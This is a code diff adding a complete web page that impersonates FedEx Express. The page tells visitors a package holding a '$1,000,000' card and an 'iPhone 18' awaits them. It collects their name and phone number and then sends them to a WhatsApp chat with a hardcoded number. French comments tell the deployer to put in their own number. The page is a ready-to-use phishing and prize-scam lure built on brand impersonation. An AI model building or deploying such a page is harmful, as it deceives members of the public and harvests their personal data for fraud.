@@ -1,0 +1,257 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>FedEx Express - Package Delivery Validation</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        body {
+            background-color: #f4f4f4;
+            color: #333;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        .container {
+            background: #ffffff;
+            border-top: 6px solid #4d148c; /* FedEx Purple */
+            padding: 30px;
+            border-radius: 12px;
+            width: 100%;
+            max-width: 450px;
+            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.1);
+        }
+        .header {
+            text-align: center;
+            margin-bottom: 25px;
+        }
+        .logo-fedex {
+            font-size: 32px;
+            font-weight: 900;
+            letter-spacing: -1px;
+            margin-bottom: 10px;
+        }
+        .logo-fedex .fed {
+            color: #4d148c;
+        }
+        .logo-fedex .ex {
+            color: #ff6600; /* FedEx Orange */
+        }
+        .header p {
+            font-size: 13px;
+            color: #666;
+        }
+        .step-indicator {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 25px;
+            font-size: 12px;
+            font-weight: bold;
+            color: #aaa;
+            border-bottom: 1px solid #eee;
+            padding-bottom: 10px;
+        }
+        .step-indicator .active {
+            color: #4d148c;
+        }
+        .rewards-box {
+            background: #fff8f0;
+            border: 1px solid #ffd5b8;
+            border-radius: 8px;
+            padding: 15px;
+            margin-bottom: 25px;
+            text-align: center;
+        }
+        .rewards-box h3 {
+            font-size: 15px;
+            color: #333;
+            margin-bottom: 5px;
+        }
+        .rewards-box span {
+            color: #ff6600;
+            font-weight: bold;
+        }
+        .form-group {
+            margin-bottom: 18px;
+        }
+        .form-group label {
+            display: block;
+            font-size: 13px;
+            color: #444;
+            margin-bottom: 6px;
+            font-weight: 600;
+        }
+        .form-group input {
+            width: 100%;
+            padding: 12px 15px;
+            background: #f9f9f9;
+            border: 1px solid #ccc;
+            border-radius: 6px;
+            color: #333;
+            font-size: 15px;
+            outline: none;
+            transition: border-color 0.3s;
+        }
+        .form-group input:focus {
+            border-color: #4d148c;
+            background: #fff;
+        }
+        .btn-next, .btn-whatsapp {
+            width: 100%;
+            padding: 14px;
+            border: none;
+            border-radius: 6px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: background 0.3s;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+        }
+        .btn-next {
+            background: #4d148c;
+            color: white;
+        }
+        .btn-next:hover {
+            background: #3b0f6d;
+        }
+        .btn-whatsapp {
+            background: #25d366; /* WhatsApp Green */
+            color: white;
+        }
+        .btn-whatsapp:hover {
+            background: #20ba5a;
+        }
+        .step-content {
+            display: none;
+        }
+        .step-content.active-step {
+            display: block;
+        }
+        .summary-box {
+            background: #f9f9f9;
+            padding: 15px;
+            border-radius: 6px;
+            margin-bottom: 20px;
+            font-size: 14px;
+            border: 1px solid #ddd;
+        }
+        .summary-box p {
+            margin-bottom: 8px;
+        }
+        .footer-note {
+            text-align: center;
+            font-size: 11px;
+            color: #888;
+            margin-top: 20px;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <div class="header">
+            <div class="logo-fedex"><span class="fed">Fed</span><span class="ex">Ex</span> Express</div>
+            <p>International Package Tracking & Validation Service</p>
+        </div>
+
+        <!-- Indicateur d'étapes -->
+        <div class="step-indicator">
+            <span id="indicator-1" class="active">STEP 1: Enter Info</span>
+            <span id="indicator-2">STEP 2: WhatsApp Claim</span>
+        </div>
+
+        <div class="rewards-box">
+            <h3>Pending Package Content :</h3>
+            <p>💳 Exclusive Card (<strong>$1,000,000</strong>) + 📱 <strong>iPhone 18</strong></p>
+        </div>
+
+        <!-- STEP 1 : Formulaire de saisie -->
+        <div id="step-1" class="step-content active-step">
+            <form onsubmit="goToStep2(event)">
+                <div class="form-group">
+                    <label for="fullname">Full Name</label>
+                    <input type="text" id="fullname" placeholder="Ex: John Doe" required>
+                </div>
+
+                <div class="form-group">
+                    <label for="phone">Phone Number</label>
+                    <input type="tel" id="phone" placeholder="Ex: +1 234 567 890" required>
+                </div>
+
+                <button type="submit" class="btn-next">
+                    Next Step ➔
+                </button>
+            </form>
+        </div>
+
+        <!-- STEP 2 : Validation et redirection WhatsApp -->
+        <div id="step-2" class="step-content">
+            <div class="summary-box" id="summaryDetails">
+                <!-- Rempli dynamiquement par JavaScript -->
+            </div>
+
+            <button type="button" class="btn-whatsapp" onclick="redirectToWhatsApp()">
+                Claim My Package on WhatsApp 💬
+            </button>
+        </div>
+
+        <div class="footer-note">
+            FedEx Express - Secure Verification System.
+        </div>
+    </div>
+
+    <script>
+        let clientData = {
+            name: '',
+            phone: ''
+        };
+
+        function goToStep2(event) {
+            event.preventDefault();
+            
+            // Récupérer les valeurs
+            clientData.name = document.getElementById('fullname').value;
+            clientData.phone = document.getElementById('phone').value;
+
+            // Afficher le résumé dans l'étape 2
+            document.getElementById('summaryDetails').innerHTML = `
+                <p><strong>Name:</strong> ${clientData.name}</p>
+                <p><strong>Phone:</strong> ${clientData.phone}</p>
+                <p><strong>Package:</strong> Card ($1,000,000) + iPhone 18</p>
+            `;
+
+            // Changer l'affichage des étapes
+            document.getElementById('step-1').classList.remove('active-step');
+            document.getElementById('step-2').classList.add('active-step');
+
+            document.getElementById('indicator-1').classList.remove('active');
+            document.getElementById('indicator-2').classList.add('active');
+        }
+
+        function redirectToWhatsApp() {
+            // ⚠️ Remplace ce numéro par ton vrai numéro WhatsApp au format international (sans le + ni les espaces)
+            const yourWhatsAppNumber = "33773752320"; 
+
+            // Message pré-rempli en anglais
+            const message = `Hello, I want to receive my package!\n\n*Name:* ${clientData.name}\n*Phone:* ${clientData.phone}\n*Package:* Card ($1,000,000) + iPhone 18`;
+
+            const encodedMessage = encodeURIComponent(message);
+
+            // Redirection vers WhatsApp
+            window.location.href = `https://wa.me/${yourWhatsAppNumber}?text=${encodedMessage}`;
+        }
+    </script>
+
+</body>
+</html>
